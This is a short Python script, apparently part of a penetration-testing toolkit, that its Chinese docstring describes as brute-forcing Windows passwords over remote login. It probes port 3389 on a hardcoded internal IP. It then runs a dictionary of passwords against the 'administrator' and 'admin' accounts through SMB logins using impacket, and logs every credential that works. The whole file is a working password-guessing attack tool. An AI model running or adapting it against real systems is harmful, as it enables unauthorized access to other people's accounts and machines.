# -*- coding: utf-8 -*-
# Created by restran on 2016/10/13

"""
通过3389远程登录，暴力破解 Windows 密码
"""

from __future__ import unicode_literals, absolute_import
from impacket import smb
import sys
import socket
import os
import logging

sys.path.insert(1, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from common.base import TaskExecutor, read_dict, ColorConsole

logger = logging.getLogger(__name__)

found_password = []

ip_list = ['10.1.3.2']
username_list = ['administrator', 'admin']


def weak_pass(password, ip, username):
    try:
        client = smb.SMB('*SMBSERVER', ip)
        client.login(username, password)
        logger.info(ColorConsole.green('[True ] %s %s:%s' % (ip, username, password)))
        found_password.append((ip, '%s:%s' % (username, password)))
        return True
    except Exception as e:
        logger.info('[False] %s %s:%s' % (ip, username, password))

    return False


def main():
    socket.setdefaulttimeout(10)
    password_list = read_dict('password.dic')
    for ip in ip_list:
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sk.connect((ip, 3389))
        except Exception as e:
            logger.info(e)
            logger.info('ip %s port %s can not be connected!' % (ip, 3389))
            continue

        for username in username_list:
            executor = TaskExecutor(password_list)
            executor.run(weak_pass, ip, username)

    for t in found_password:
        logger.info('%s password is %s' % t)


if __name__ == "__main__":
    main()
